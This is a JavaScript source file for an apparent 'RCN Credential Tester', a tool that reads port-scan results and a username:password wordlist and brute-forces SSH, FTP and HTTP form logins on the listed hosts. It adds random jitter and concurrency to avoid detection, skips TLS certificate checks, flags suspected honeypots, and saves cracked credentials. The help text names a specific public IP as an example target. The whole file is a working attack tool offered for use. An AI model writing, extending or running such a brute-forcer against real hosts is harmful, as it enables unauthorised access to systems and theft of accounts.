import fs               from "node:fs";
import https            from "node:https";
import { createRequire } from "node:module";
import { jitter, runPool } from "./utils.js";

const require = createRequire(import.meta.url);

// --- ʕ•ᴥ•ʔ optional dependencies ʕ•ᴥ•ʔ ---

// Load ssh2 and basic-ftp optionally so missing packages don't crash the tool
let SSHClient = null;
let ftpLib    = null;
let axios     = null;

try { ({ Client: SSHClient } = require("ssh2")); }  catch { console.warn("[warn] ssh2 not installed — SSH testing disabled"); }
try { ftpLib = require("basic-ftp"); }               catch { console.warn("[warn] basic-ftp not installed — FTP testing disabled"); }
try { ({ default: axios } = await import("axios")); } catch { console.warn("[warn] axios not installed — HTTP testing disabled"); }

// --- ʕ•ᴥ•ʔ config ʕ•ᴥ•ʔ ---

const cfg = JSON.parse(fs.readFileSync(new URL("../config/settings.json", import.meta.url), "utf8")).credtest;

const CRED_CONCURRENCY = cfg.concurrency;
const JITTER_MIN_MS    = cfg.jitterMinMs;
const JITTER_MAX_MS    = cfg.jitterMaxMs;
const TIMEOUT_MS       = cfg.timeoutMs;
const SSH_PORTS        = new Set(cfg.sshPorts);
const FTP_PORTS        = new Set(cfg.ftpPorts);
const HTTP_PORTS       = new Set(cfg.httpPorts);
const HTTPS_PORTS      = new Set(cfg.httpsPorts);
const HTTP_ENDPOINTS   = cfg.httpEndpoints;
const HTTP_FIELDS      = cfg.httpFields;

// --- ʕ•ᴥ•ʔ ssh ʕ•ᴥ•ʔ ---

/**
 * Attempts SSH login with the given credentials.
 * Returns true if authentication succeeds, false otherwise.
 *
 * @param {string} host
 * @param {number} port
 * @param {string} username
 * @param {string} password
 * @returns {Promise<boolean>}
 */
function trySSH(host, port, username, password) {
    return new Promise((resolve) => {
        if (!SSHClient) return resolve(false);

        const conn = new SSHClient();
        const timer = setTimeout(() => { conn.destroy(); resolve(false); }, TIMEOUT_MS);

        conn.on("ready", () => {
            clearTimeout(timer);
            conn.end();
            resolve(true);
        });

        conn.on("error", () => {
            clearTimeout(timer);
            resolve(false);
        });

        conn.connect({ host, port, username, password, readyTimeout: TIMEOUT_MS });
    });
}

// --- ʕ•ᴥ•ʔ ftp ʕ•ᴥ•ʔ ---

/**
 * Attempts FTP login with the given credentials.
 * Tries both plain and implicit TLS connections.
 *
 * @param {string} host
 * @param {number} port
 * @param {string} user
 * @param {string} password
 * @returns {Promise<boolean>}
 */
async function tryFTP(host, port, user, password) {
    if (!ftpLib) return false;

    const client = new ftpLib.Client(TIMEOUT_MS);
    client.ftp.verbose = false;

    // Try plain FTP first, then implicit TLS
    for (const secure of [false, true]) {
        try {
            await client.access({ host, port, user, password, secure, secureOptions: { rejectUnauthorized: false } });
            client.close();
            return true;
        } catch {
            // Try next mode
        }
    }

    client.close();
    return false;
}

// --- ʕ•ᴥ•ʔ http ʕ•ᴥ•ʔ ---

// created once and reused across all HTTPS requests
const httpsAgent = new https.Agent({ rejectUnauthorized: false });
const ERROR_KEYWORDS = ["invalid", "incorrect", "failed", "wrong", "error", "denied"];

/**
 * Attempts HTTP/HTTPS form login across common endpoints and field names.
 * Detects success by a redirect response (3xx) with no error indicators.
 *
 * @param {string} host
 * @param {number} port
 * @param {string} username
 * @param {string} password
 * @param {boolean} useHTTPS
 * @returns {Promise<boolean>}
 */
async function tryHTTP(host, port, username, password, useHTTPS) {
    if (!axios) return false;

    const scheme = useHTTPS ? "https" : "http";
    const base   = `${scheme}://${host}:${port}`;

    for (const endpoint of HTTP_ENDPOINTS) {
        for (const fields of HTTP_FIELDS) {
            try {
                const payload = new URLSearchParams({
                    [fields.user]: username,
                    [fields.pass]: password,
                });

                const response = await axios.post(`${base}${endpoint}`, payload.toString(), {
                    headers:        { "Content-Type": "application/x-www-form-urlencoded" },
                    timeout:        TIMEOUT_MS,
                    maxRedirects:   0,
                    validateStatus: (s) => s < 500,
                    httpsAgent:     useHTTPS ? httpsAgent : undefined,
                });

                const body = typeof response.data === "string" ? response.data.toLowerCase() : "";
                const hasError = ERROR_KEYWORDS.some(k => body.includes(k));

                // success = redirect (301-303) or 200 with no error keywords in body
                const isSuccess = (response.status >= 301 && response.status <= 303) ||
                    (response.status === 200 && !hasError);

                if (isSuccess) return true;
            } catch {
                // connection failed — try next endpoint
            }
        }
    }
    return false;
}

// --- ʕ•ᴥ•ʔ service detection ʕ•ᴥ•ʔ ---

/**
 * Determines the service type for a port based on port number and scan proto value.
 *
 * @param {number} portNum   - The port number
 * @param {string} portValue - The proto/banner string from the scan JSON
 * @returns {"ssh"|"ftp"|"http"|"https"|null}
 */
function detectService(portNum, portValue) {
    // support both old string format and new object format
    const proto  = typeof portValue === "object" ? portValue.proto   : portValue.split(":")[0].trim();
    const banner = typeof portValue === "object" ? (portValue.banner || "") : portValue;

    if (SSH_PORTS.has(portNum))                                      return "ssh";
    if (FTP_PORTS.has(portNum))                                      return "ftp";
    if (!noHTTP && HTTPS_PORTS.has(portNum))                         return "https";
    if (!noHTTP && HTTP_PORTS.has(portNum))                          return "http";
    if (!noHTTP && proto === "TLS")                                  return "https";
    if (!noHTTP && proto === "TCP" && banner.startsWith("HTTP"))     return "http";
    return null;
}

// --- ʕ•ᴥ•ʔ wordlist ʕ•ᴥ•ʔ ---

/**
 * Reads a wordlist file and returns credential pairs.
 * Each line must be in the format username:password.
 * Lines starting with # and blank lines are ignored.
 *
 * @param {string} filePath
 * @returns {{ user: string, pass: string }[]}
 */
function parseWordlist(filePath) {
    return fs.readFileSync(filePath, "utf8")
        .split("\n")
        .map((l) => l.trim())
        .filter((l) => l && !l.startsWith("#"))
        .map((l) => {
            const idx = l.indexOf(":");
            return { user: l.slice(0, idx), pass: l.slice(idx + 1) };
        });
}

// --- ʕ•ᴥ•ʔ host tester ʕ•ᴥ•ʔ ---

/**
 * Tests all detected services on a host against the full wordlist.
 * Stops trying a port as soon as valid credentials are found.
 *
 * @param {string} host
 * @param {object} ports       - Port map from scan JSON { "22": "TCP", ... }
 * @param {{ user: string, pass: string }[]} credentials
 * @returns {Promise<object>}  - Map of port → { user, pass, service } for successful logins
 */
async function testHost(host, ports, credentials) {
    const found      = {};
    let honeypot     = false;

    for (const [portStr, portValue] of Object.entries(ports)) {
        const portNum = Number(portStr);
        const service = detectService(portNum, portValue);
        if (!service) continue;

        console.log(`  Testing ${host}:${portNum} [${service.toUpperCase()}]`);

        const abort      = new AbortController();
        let firstAttempt = true;

        const tasks = credentials.map(({ user, pass }) => async () => {
            if (abort.signal.aborted) return;
            await jitter(JITTER_MIN_MS, JITTER_MAX_MS);
            if (abort.signal.aborted) return;

            let success = false;
            if (service === "ssh")   success = await trySSH(host, portNum, user, pass);
            if (service === "ftp")   success = await tryFTP(host, portNum, user, pass);
            if (service === "http")  success = await tryHTTP(host, portNum, user, pass, false);
            if (service === "https") success = await tryHTTP(host, portNum, user, pass, true);

            if (success && !abort.signal.aborted) {
                abort.abort();

                // first credential accepted = strong honeypot signal
                if (firstAttempt) {
                    honeypot = true;
                    console.log(`  HONEYPOT ${host}:${portNum} [${service.toUpperCase()}] accepted first credential ${user}:${pass}`);
                    found[portStr] = { user, pass, service: service.toUpperCase(), honeypot: true };
                } else {
                    console.log(`  HIT      ${host}:${portNum} [${service.toUpperCase()}] ${user}:${pass}`);
                    found[portStr] = { user, pass, service: service.toUpperCase() };
                }
            }
            firstAttempt = false;
        });

        await runPool(tasks, CRED_CONCURRENCY, () => {});
    }

    return { found, honeypot };
}

// --- ʕ•ᴥ•ʔ main ʕ•ᴥ•ʔ ---

const args        = process.argv.slice(2);
const scanFile    = args[0];
const wordlistFile = args[1];
const hostsArg    = args.find(a => a.startsWith("--hosts="));
const targetHosts = hostsArg ? new Set(hostsArg.replace("--hosts=", "").split(",")) : null;
const noHTTP      = args.includes("--no-http");

if (args.includes("--help") || args.includes("-h")) {
    console.log(`
  RCN Credential Tester

  usage:
    node src/credtest.js <scan.json> <wordlist.txt> [--hosts=ip1,ip2,...] [--no-http] [--help]

  arguments:
    scan.json         scan result file produced by scanner.js
    wordlist.txt      credential pairs, one per line in username:password format

  flags:
    --hosts=ip1,ip2   only test specific IPs from the scan file (comma-separated)
    --no-http         skip HTTP/HTTPS credential testing (unreliable success detection)
    --help / -h       show this help

  examples:
    node src/credtest.js scans/results.json config/wordlist.txt
    node src/credtest.js scans/results.json config/wordlist.txt --no-http
    node src/credtest.js scans/results.json config/wordlist.txt --hosts=37.27.7.154
`);
    process.exit(0);
}

if (!scanFile || !wordlistFile) {
    console.error("Usage: node src/credtest.js <scan.json> <wordlist.txt> [--hosts=ip1,ip2,...]");
    console.error("Example: node src/credtest.js scans/results.json config/wordlist.txt --hosts=1.2.3.4,1.2.3.5");
    process.exit(1);
}

const scanResults  = JSON.parse(fs.readFileSync(scanFile, "utf8"));
const credentials  = parseWordlist(wordlistFile);
const targets      = targetHosts ? scanResults.filter(h => targetHosts.has(h.host)) : scanResults;

if (targetHosts && targets.length === 0) {
    console.error("No matching hosts found in scan file for the specified --hosts");
    process.exit(1);
}

console.log(`Loaded ${targets.length} target host(s), ${credentials.length} credential pair(s)\n`);

for (const hostEntry of targets) {
    console.log(`[ ${hostEntry.host} ]`);
    const { found, honeypot } = await testHost(hostEntry.host, hostEntry.ports, credentials);

    if (Object.keys(found).length > 0) {
        hostEntry.credentials = found;
        if (honeypot) hostEntry.honeypot = "suspected — first credential accepted immediately";
        console.log(`  → Saved credentials for ${hostEntry.host}${honeypot ? " [HONEYPOT SUSPECTED]" : ""}\n`);
    } else {
        hostEntry.credentials = "none found";
        console.log(`  → No valid credentials found\n`);
    }

    fs.writeFileSync(scanFile, JSON.stringify(scanResults, null, 2), "utf8");
}

console.log("Done.");
